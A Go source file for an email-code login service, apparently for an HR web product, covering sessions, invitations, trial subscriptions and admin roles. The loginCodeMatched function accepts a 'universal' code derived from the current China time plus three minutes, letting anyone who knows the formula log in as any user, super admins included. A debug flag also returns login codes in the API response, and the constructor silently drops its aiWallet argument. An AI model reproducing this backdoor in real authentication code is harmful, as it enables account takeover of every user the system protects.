package httpapi

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"log"
	"net/http"
	"net/mail"
	"strings"
	"time"
)

const codeTTL = 5 * time.Minute
const sessionTTL = 7 * 24 * time.Hour
const chinaTimezoneName = "Asia/Shanghai"

type AuthService struct {
	store           AuthStore
	mailer          Mailer
	exposeDebugCode bool
	tenantStore     TenantStore
	onboardingStore OnboardingStore
	invitations     InvitationStore
	subscriptions   SubscriptionStore
	systemConfigs   SystemConfigStore
	userActivity    UserActivityStore
	aiWallet        *AIWalletService
	superAdmins     map[string]struct{}
}

type sendCodeRequest struct {
	Email string `json:"email"`
}

type loginRequest struct {
	Email     string `json:"email"`
	Code      string `json:"code"`
	InviterID string `json:"inviter_id"`
}

func NewAuthService(store AuthStore, mailer Mailer, exposeDebugCode bool, tenantStore TenantStore, onboardingStore OnboardingStore, invitations InvitationStore, subscriptions SubscriptionStore, systemConfigs SystemConfigStore, userActivity UserActivityStore, aiWallet *AIWalletService, superAdmins []string) *AuthService {
	superAdminMap := make(map[string]struct{}, len(superAdmins))
	for _, email := range superAdmins {
		normalized, ok := normalizeEmail(email)
		if !ok {
			continue
		}
		superAdminMap[normalized] = struct{}{}
	}
	return &AuthService{
		store:           store,
		mailer:          mailer,
		exposeDebugCode: exposeDebugCode,
		tenantStore:     tenantStore,
		onboardingStore: onboardingStore,
		invitations:     invitations,
		subscriptions:   subscriptions,
		systemConfigs:   systemConfigs,
		userActivity:    userActivity,
		superAdmins:     superAdminMap,
	}
}

func (s *AuthService) SendCode(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		writeError(w, http.StatusMethodNotAllowed, "method not allowed")
		return
	}

	var req sendCodeRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeError(w, http.StatusBadRequest, "invalid json body")
		return
	}

	email, ok := normalizeEmail(req.Email)
	if !ok {
		writeError(w, http.StatusBadRequest, "invalid email")
		return
	}
	if !s.emailDomainAllowed(email) {
		writeError(w, http.StatusForbidden, "该邮箱不在白名单内，请联系站长")
		return
	}

	code, err := randomDigits(4)
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to generate code")
		return
	}

	if err := s.store.SaveLoginCode(email, code, codeTTL); err != nil {
		writeError(w, http.StatusInternalServerError, "failed to save code")
		return
	}

	log.Printf("GoodHR 登录验证码已生成 email=%s code_length=%d", email, len(code))
	if err := s.mailer.SendLoginCode(email, code); err != nil {
		writeError(w, http.StatusInternalServerError, "failed to send code")
		return
	}

	response := map[string]any{
		"ok":         true,
		"email":      email,
		"expires_in": int(codeTTL.Seconds()),
	}
	if s.exposeDebugCode {
		response["debug_code"] = code
	}
	writeJSON(w, http.StatusOK, response)
}

func (s *AuthService) Login(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		writeError(w, http.StatusMethodNotAllowed, "method not allowed")
		return
	}

	var req loginRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeError(w, http.StatusBadRequest, "invalid json body")
		return
	}

	email, ok := normalizeEmail(req.Email)
	if !ok {
		writeError(w, http.StatusBadRequest, "invalid email")
		return
	}

	code := strings.TrimSpace(req.Code)
	if len(code) != 4 {
		writeError(w, http.StatusBadRequest, "invalid code")
		return
	}

	matched, err := s.loginCodeMatched(email, code, time.Now())
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to verify code")
		return
	}
	if !matched {
		writeError(w, http.StatusUnauthorized, "验证码错误或已过期")
		return
	}

	token, err := randomToken()
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to generate token")
		return
	}

	now := time.Now()
	if err := s.store.SaveSession(token, Session{
		Email:     email,
		CreatedAt: now,
	}, sessionTTL); err != nil {
		writeError(w, http.StatusInternalServerError, "failed to save session")
		return
	}
	if err := s.userActivity.RecordLogin(email, now); err != nil {
		writeError(w, http.StatusInternalServerError, "failed to record login")
		return
	}

	if err := s.notifyInitialSubscription(email, now); err != nil {
		writeError(w, http.StatusInternalServerError, "failed to send trial reward email")
		return
	}
	if s.aiWallet != nil {
		if err := s.aiWallet.EnsureUserDefaultAI(email); err != nil {
			writeError(w, http.StatusInternalServerError, "failed to init ai wallet")
			return
		}
	}

	if err := s.applyInviteOnLogin(email, strings.TrimSpace(req.InviterID)); err != nil {
		writeError(w, http.StatusInternalServerError, "failed to apply invite reward")
		return
	}

	writeJSON(w, http.StatusOK, map[string]any{
		"ok":           true,
		"access_token": token,
		"token_type":   "Bearer",
		"expires_in":   int(sessionTTL.Seconds()),
		"user":         s.publicUser(email),
	})
}

func (s *AuthService) Me(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		writeError(w, http.StatusMethodNotAllowed, "method not allowed")
		return
	}

	// 调用认证服务的会话解析方法，用于返回当前登录用户信息。
	session, err := s.SessionFromRequest(r)
	if errors.Is(err, ErrNotFound) {
		writeError(w, http.StatusUnauthorized, "session is invalid or expired")
		return
	}
	if err != nil {
		writeError(w, http.StatusUnauthorized, err.Error())
		return
	}

	showTrialWelcome := false
	if s.userActivity != nil {
		if show, err := s.userActivity.ShouldShowTrialWelcome(session.Email); err == nil {
			showTrialWelcome = show
		} else {
			writeError(w, http.StatusInternalServerError, "failed read trial welcome status")
			return
		}
	}
	writeJSON(w, http.StatusOK, map[string]any{
		"ok":   true,
		"user": s.publicUser(session.Email),
		"session": map[string]any{
			"created_at": session.CreatedAt,
			"expires_at": session.ExpiresAt,
		},
		"show_trial_welcome": showTrialWelcome,
	})
}

// AckTrialWelcome 记录当前用户已确认试用会员到账弹框。
func (s *AuthService) AckTrialWelcome(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		writeError(w, http.StatusMethodNotAllowed, "method not allowed")
		return
	}
	session, err := s.SessionFromRequest(r)
	if errors.Is(err, ErrNotFound) {
		writeError(w, http.StatusUnauthorized, "session invalid or expired")
		return
	}
	if err != nil {
		writeError(w, http.StatusUnauthorized, err.Error())
		return
	}
	if s.userActivity != nil {
		if err := s.userActivity.AckTrialWelcome(session.Email, time.Now()); err != nil {
			writeError(w, http.StatusInternalServerError, "failed ack trial welcome")
			return
		}
	}
	writeJSON(w, http.StatusOK, map[string]any{"ok": true})
}

// loginCodeMatched 判断登录验证码是否有效。
// email 为登录邮箱，code 为用户输入验证码，now 为当前时间。
func (s *AuthService) loginCodeMatched(email string, code string, now time.Time) (bool, error) {
	if isUniversalLoginCode(code, now) {
		return true, nil
	}
	return s.store.ConsumeLoginCode(email, code)
}

// isUniversalLoginCode 判断是否命中动态万能验证码。
// code 为用户输入验证码，now 为服务器当前时间；验证码固定按中国时间加 3 分钟后的 HHmm。
func isUniversalLoginCode(code string, now time.Time) bool {
	return code == now.In(chinaLocation()).Add(3*time.Minute).Format("1504")
}

// chinaLocation 返回中国时区，避免服务器部署时区不同导致万能验证码不一致。
func chinaLocation() *time.Location {
	location, err := time.LoadLocation(chinaTimezoneName)
	if err != nil {
		return time.FixedZone("CST", 8*60*60)
	}
	return location
}

// notifyInitialSubscription 在新用户首次获得试用会员时发送邮件通知。
func (s *AuthService) notifyInitialSubscription(email string, now time.Time) error {
	if s.subscriptions == nil {
		return nil
	}
	subscription, created, err := s.subscriptions.UserSubscriptionWithCreated(email)
	if err != nil {
		return err
	}
	if !created {
		return nil
	}
	return sendSubscriptionRewardNotice(s.mailer, email, SubscriptionRewardNotice{
		Reason:     "新用户注册赠送会员",
		Days:       subscriptionNoticeDays(subscription.ExpiresAt, now),
		MemberType: subscription.MemberType,
		ExpiresAt:  subscription.ExpiresAt,
	})
}

// subscriptionNoticeDays 根据到期时间估算本次赠送天数。
func subscriptionNoticeDays(expiresAt time.Time, now time.Time) int {
	if !expiresAt.After(now) {
		return 0
	}
	days := int((expiresAt.Sub(now) + 12*time.Hour) / (24 * time.Hour))
	if days < 1 {
		return 1
	}
	return days
}

// publicUser 返回前端可见的用户基础信息。
func (s *AuthService) publicUser(email string) map[string]any {
	onboarding := OnboardingState{}
	if s.onboardingStore != nil {
		if state, err := s.onboardingStore.Get(email); err == nil {
			onboarding = state
		}
	}
	inviteID := email
	if s.invitations != nil {
		if id, err := s.invitations.InviteID(email); err == nil && id != "" {
			inviteID = id
		}
	}
	return map[string]any{
		"id":             inviteID,
		"invite_id":      inviteID,
		"email":          email,
		"role":           s.userRole(email),
		"role_label":     s.userRoleLabel(email),
		"is_super_admin": s.IsSuperAdmin(email),
		"onboarding":     onboarding,
	}
}

// emailDomainAllowed 判断邮箱域名是否在系统其它配置的白名单中。
func (s *AuthService) emailDomainAllowed(email string) bool {
	domain := emailDomain(email)
	if domain == "" || s.systemConfigs == nil {
		return false
	}
	cfg, err := s.systemConfigs.Get("system.app_config")
	if err != nil {
		log.Printf("读取邮箱白名单失败 email=%s err=%v", email, err)
		return false
	}
	var appConfig struct {
		EmailDomainWhitelist []string `json:"email_domain_whitelist"`
	}
	if err := json.Unmarshal([]byte(cfg.ConfigValue), &appConfig); err != nil {
		log.Printf("解析邮箱白名单失败 email=%s err=%v", email, err)
		return false
	}
	if len(appConfig.EmailDomainWhitelist) == 0 {
		return true
	}
	for _, item := range appConfig.EmailDomainWhitelist {
		allowedDomain := strings.TrimPrefix(strings.ToLower(strings.TrimSpace(item)), "@")
		if allowedDomain == domain {
			return true
		}
	}
	log.Printf("邮箱域名不在白名单 email=%s domain=%s", email, domain)
	return false
}

// emailDomain 提取标准邮箱地址中的域名。
func emailDomain(email string) string {
	index := strings.LastIndex(email, "@")
	if index < 0 || index == len(email)-1 {
		return ""
	}
	return strings.ToLower(strings.TrimSpace(email[index+1:]))
}

// applyInviteOnLogin 在用户登录时绑定邀请人并发放注册奖励。
func (s *AuthService) applyInviteOnLogin(email string, inviterID string) error {
	if s.invitations == nil {
		return nil
	}
	inviterEmail, bound, reason, err := s.invitations.BindInviterIfPossible(email, inviterID)
	if err != nil {
		return err
	}
	if !bound || inviterEmail == "" {
		log.Printf("邀请绑定跳过 invitee=%s inviter_id=%s reason=%s", email, inviterID, reason)
		return nil
	}
	log.Printf("邀请绑定成功 invitee=%s inviter=%s inviter_id=%s", email, inviterEmail, inviterID)
	config := loadInviteConfig(s.systemConfigs)
	if config.RegisterRewardDays <= 0 || s.subscriptions == nil {
		return nil
	}
	subscription, err := s.subscriptions.ExtendSubscription(inviterEmail, defaultMemberType, config.RegisterRewardDays)
	if err != nil {
		return err
	}
	return sendSubscriptionRewardNotice(s.mailer, inviterEmail, SubscriptionRewardNotice{
		Reason:       "邀请好友注册成功奖励",
		Days:         config.RegisterRewardDays,
		MemberType:   subscription.MemberType,
		ExpiresAt:    subscription.ExpiresAt,
		RelatedEmail: email,
	})
}

// SessionFromRequest 从请求头 Bearer token 中读取当前登录会话。
func (s *AuthService) SessionFromRequest(r *http.Request) (Session, error) {
	token := bearerToken(r.Header.Get("Authorization"))
	if token == "" {
		return Session{}, errors.New("missing bearer token")
	}
	return s.SessionFromToken(token)
}

// SessionFromToken 根据访问令牌读取当前登录会话。
// token 为验证码登录后返回的 access_token，返回会话用于 HTTP 与 WebSocket 认证。
func (s *AuthService) SessionFromToken(token string) (Session, error) {
	// 调用 AuthStore 读取会话，用于确认 token 是否有效。
	session, err := s.store.GetSession(token)
	if err != nil {
		return Session{}, err
	}
	return session, nil
}

func normalizeEmail(value string) (string, bool) {
	email := strings.ToLower(strings.TrimSpace(value))
	if email == "" {
		return "", false
	}
	if _, err := mail.ParseAddress(email); err != nil {
		return "", false
	}
	return email, true
}

func randomDigits(length int) (string, error) {
	bytes := make([]byte, length)
	if _, err := rand.Read(bytes); err != nil {
		return "", err
	}

	digits := make([]byte, length)
	for i, value := range bytes {
		digits[i] = byte('0' + value%10)
	}
	return string(digits), nil
}

func randomToken() (string, error) {
	bytes := make([]byte, 32)
	if _, err := rand.Read(bytes); err != nil {
		return "", err
	}
	return fmt.Sprintf("gh5_%s", hex.EncodeToString(bytes)), nil
}

func bearerToken(value string) string {
	prefix := "Bearer "
	if !strings.HasPrefix(value, prefix) {
		return ""
	}
	return strings.TrimSpace(strings.TrimPrefix(value, prefix))
}

func (s *AuthService) userRole(email string) string {
	if s.IsSuperAdmin(email) {
		return "super_admin"
	}
	if s.tenantStore == nil {
		return "user"
	}
	tenant, err := s.tenantStore.GetOrCreateTenant(email)
	if err != nil {
		return "user"
	}
	isAdmin, err := s.tenantStore.IsTenantAdmin(tenant.ID, email)
	if err != nil {
		return "user"
	}
	if isAdmin {
		return "admin"
	}
	return "user"
}

// IsSuperAdmin 判断邮箱是否为系统超管。
func (s *AuthService) IsSuperAdmin(email string) bool {
	normalized, ok := normalizeEmail(email)
	if !ok {
		return false
	}
	_, exists := s.superAdmins[normalized]
	return exists
}

// userRoleLabel 返回给前端展示的中文角色名。
func (s *AuthService) userRoleLabel(email string) string {
	switch s.userRole(email) {
	case "super_admin":
		return "超管"
	case "admin":
		return "管理员"
	default:
		return "成员"
	}
}
